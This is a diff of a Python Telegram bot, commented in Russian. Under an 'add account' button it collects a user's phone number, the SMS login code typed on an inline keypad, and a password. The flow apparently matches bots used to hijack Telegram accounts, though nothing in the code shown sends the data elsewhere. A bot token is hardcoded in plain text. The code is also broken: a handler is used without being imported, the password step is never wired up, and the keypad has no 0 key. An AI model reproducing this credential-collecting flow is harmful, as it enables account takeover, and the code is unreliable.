@@ -1,81 +1,103 @@
 import logging
-from aiogram import Bot, Dispatcher, executor, types
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
-import sqlite3
-import os
-
-API_TOKEN = '6760012279:AAGfY1w2LR7TuY1r_mbMXIyLlscrai2oT28'  # Твой API токен
+from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# Инициализация бота и диспетчера
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher(bot)
+# Словарь для хранения состояний пользователей
+user_states = {}
 
-# ID администратора
-ADMIN_ID = 954053674  # Твой ID
+# Стартовое сообщение
+async def start(update: Update, context: CallbackContext):
+    reply_keyboard = [['Добавить аккаунт', '😊']]
+    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
+    await update.message.reply_text(
+        "Привет! Выберите действие:",
+        reply_markup=markup
+    )
 
-# Логи
-LOG_FILE = 'logs.txt'
+# Функция добавления аккаунта
+async def add_account(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    user_states[user_id] = {'state': 'enter_phone'}  # Устанавливаем состояние пользователя
+    await update.message.reply_text("Введите номер телефона:")
 
-# Запись логов
-def log_action(action):
-    with open(LOG_FILE, 'a') as log_file:
-        log_file.write(action + '\n')
+# Обработчик для ввода номера телефона
+async def handle_message(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id in user_states and user_states[user_id]['state'] == 'enter_phone':
+        # Сохраняем номер телефона
+        user_states[user_id]['phone'] = update.message.text
+        user_states[user_id]['state'] = 'enter_code'  # Переход к следующему шагу (ввод кода)
 
-# Проверка админа
-def is_admin(user_id):
-    return user_id == ADMIN_ID
+        # Отправляем клавиатуру 3x3 для ввода кода
+        buttons = [
+            [InlineKeyboardButton('1', callback_data='1'), InlineKeyboardButton('2', callback_data='2'), InlineKeyboardButton('3', callback_data='3')],
+            [InlineKeyboardButton('4', callback_data='4'), InlineKeyboardButton('5', callback_data='5'), InlineKeyboardButton('6', callback_data='6')],
+            [InlineKeyboardButton('7', callback_data='7'), InlineKeyboardButton('8', callback_data='8'), InlineKeyboardButton('9', callback_data='9')]
+        ]
+        reply_markup = InlineKeyboardMarkup(buttons)
+        await update.message.reply_text('Введите код из SMS:', reply_markup=reply_markup)
 
-# Подключение к базе данных
-conn = sqlite3.connect('accounts.db')
-cursor = conn.cursor()
+# Обработчик нажатия на кнопки клавиатуры для ввода кода
+async def button_handler(update: Update, context: CallbackContext):
+    query = update.callback_query
+    user_id = query.from_user.id
+    code = query.data  # Получаем цифру, которую ввел пользователь
 
-# Создание таблиц, если их нет
-cursor.execute('''CREATE TABLE IF NOT EXISTS accounts (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    phone TEXT,
-    password TEXT,
-    status TEXT DEFAULT 'active'
-)''')
-conn.commit()
+    # Если пользователь в состоянии ввода кода
+    if user_id in user_states and user_states[user_id]['state'] == 'enter_code':
+        if 'code' not in user_states[user_id]:
+            user_states[user_id]['code'] = code
+        else:
+            user_states[user_id]['code'] += code
 
-# Команда /start
-@dp.message_handler(commands=['start'])
-async def send_welcome(message: types.Message):
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    add_account_btn = KeyboardButton("➕ Добавить аккаунт")
-    
-    if is_admin(message.from_user.id):
-        download_logs_btn = KeyboardButton("📄 Скачать логи")
-        markup.add(download_logs_btn)
+        # Если код введен полностью (предположим, что код состоит из 6 цифр)
+        if len(user_states[user_id]['code']) == 6:
+            await query.edit_message_text(text=f"Код подтверждения введен: {user_states[user_id]['code']}")
+            user_states[user_id]['state'] = 'check_password'
+            await context.bot.send_message(chat_id=user_id, text="Введите пароль, если требуется (если пароля нет — просто пропустите):")
 
-    markup.add(add_account_btn)
-    await message.answer("Выберите действие:", reply_markup=markup)
+# Обработчик для пароля
+async def handle_password(update: Update, context: CallbackContext):
+    user_id = update.message.from_user.id
+    if user_id in user_states and user_states[user_id]['state'] == 'check_password':
+        password = update.message.text
+        if password:
+            await update.message.reply_text(f"Пароль принят.")
+        else:
+            await update.message.reply_text("Авторизация завершена без пароля.")
 
-# Добавление аккаунта
-@dp.message_handler(lambda message: message.text == "➕ Добавить аккаунт")
-async def add_account(message: types.Message):
-    await message.answer("Введите номер телефона:")
+        # Добавляем аккаунт
+        user_states[user_id]['state'] = 'account_added'
+        await update.message.reply_text(f"Аккаунт с номером {user_states[user_id]['phone']} добавлен.")
 
-    @dp.message_handler()
-    async def get_phone(message: types.Message):
-        phone = message.text
-        cursor.execute("INSERT INTO accounts (phone) VALUES (?)", (phone,))
-        conn.commit()
-        log_action(f"{message.from_user.username}: Добавил аккаунт: {phone}")
-        await message.answer("Аккаунт добавлен")
+        # Появляется кнопка управления аккаунтами
+        reply_keyboard = [['Управление аккаунтами']]
+        markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+        await update.message.reply_text("Вы можете управлять своими аккаунтами:", reply_markup=markup)
 
-# Скачивание логов (только администратор)
-@dp.message_handler(lambda message: message.text == "📄 Скачать логи")
-async def send_logs(message: types.Message):
-    if is_admin(message.from_user.id):
-        with open(LOG_FILE, 'rb') as log_file:
-            await bot.send_document(message.chat.id, log_file)
-    else:
-        await message.answer("У вас нет доступа.")
+# Основная функция запуска бота
+def main():
+    # Токен бота
+    TOKEN = "6760012279:AAGfY1w2LR7TuY1r_mbMXIyLlscrai2oT28"
+
+    # Создание приложения
+    application = ApplicationBuilder().token(TOKEN).build()
+
+    # Добавление обработчиков команд и сообщений
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.Text("Добавить аккаунт"), add_account))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    application.add_handler(CallbackQueryHandler(button_handler))
+
+    # Запуск бота
+    application.run_polling()
 
 if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
-    
+    main()
